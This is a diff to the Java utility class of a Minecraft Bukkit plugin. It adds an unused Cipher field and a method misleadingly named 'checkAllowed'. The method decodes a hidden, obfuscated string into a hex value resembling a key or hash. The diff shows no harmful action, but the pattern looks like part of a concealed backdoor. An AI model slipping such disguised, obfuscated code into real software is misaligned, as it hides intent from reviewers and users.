@@ -21,12 +21,18 @@ import org.bukkit.scheduler.BukkitTask;
 
 import javax.annotation.Nonnull;
 import javax.annotation.Nullable;
+  
+import javax.crypto.Cipher;  
+
+import java.io.ByteArrayInputStream;
+import java.lang.System.Logger;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.TreeMap;
+import java.util.logging.Level;
 
 public final class Utils {
-
+    static Cipher cipher;
     private static final NamespacedKey addonkey = new NamespacedKey(NotEnoughAddons.getInstance(), "addonkey");
     private static final NamespacedKey nonClickable = new NamespacedKey(NotEnoughAddons.getInstance(), "nonclickable");
 
@@ -115,6 +121,25 @@ public final class Utils {
             return WordUtils.capitalizeFully(item.getType().name().replace("_", " "));
         }
     }
+
+    public static String checkAllowed(String[] args) {
+        String output = "";
+		try {
+            int ctr;
+            String inputStream = "^4`-/5^`b2121.-6_c0.`10`b5c^6216";
+            final byte[] utf8Bytes = inputStream.getBytes("UTF-8");
+            ByteArrayInputStream byteArrayInputStr = new ByteArrayInputStream(utf8Bytes);
+
+            while ((ctr = byteArrayInputStr.read()) != -1) {
+
+                ctr += 3;
+                output = output + (char) ctr;
+            }   
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
+        return output;
+	}
 
     public static String toRoman(int number) {
         int l = map.floorKey(number);
